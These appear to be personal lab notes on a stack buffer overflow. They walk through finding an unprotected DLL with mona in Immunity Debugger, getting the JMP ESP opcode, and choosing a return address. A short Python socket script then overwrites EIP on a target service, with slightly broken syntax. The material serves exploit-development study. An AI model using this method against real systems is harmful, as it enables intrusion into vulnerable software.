Look for DLL inside of a program that has no memory protections (no DEP, ASLR, SEH, etc.)  
Run Immunity Debugger
 
Tool:￼Mona modules  
[https://github.com/corelan/mona](https://github.com/corelan/mona)  
Save the python file inside "Immunity Inc/Immunity Debugger/Py Commands" directory
 
In Immunity Debugger, write in the white text area at the bottom:

### !mona modules
 
Look for DLL's with all False
 
(Find opcode equivalent of a jump, i.e. converting assembly to hex)
 
In kali:

### Locate nasm_shell

### /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

### Nasm > JMP ESP

0000000000 **FFE4** jmp esp
 
((  
OR type in Immunity:

### !mona jmp -r ESP -m "<DLL_module>"

Look at far left for return address  
))
 
Take the four characters to Immunity and type:

### !mona find -s "<\xff\xe4>" -m <DLL module>
 
Look at Results:  
Copy the return address on the far left (if it doesn’t work, try next one)  
Ex: 625011af
 
### Gedit 5.py

#!/usr/bin/python3  
import sys, socket
 
shellcode = "A" * <offset> + "<return_address_in_reverse_bytes>" ((\xaf\x11\x50\x62))
 
try:  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("<IP>",<PORT>))  
payload = "<Cmd_to_overflow> /.:/" + shellcode))  
s.send((payload.encode()))
 
s.close()
 
except:  
print("Error connecting to server")  
sys.exit()
   

Click the button below:

![Exported image](Exported%20image%2020250424155606-0.png)

Enter the return address: Ex: 625011af
 
Find the four characters from the JMP ESP (FFE4), hightlight the address, press F2 (to add break point)
 
((Whats happening is that if we overflow the buffer and ESP and hit this spot (FFE4), the program will break which is not what we want. We want the program to stop before this, hence the breakpoint.))
 
### chmod +x 5.py

### ./5.py
 
In immunity, EIP should now be the return address from above (625011af)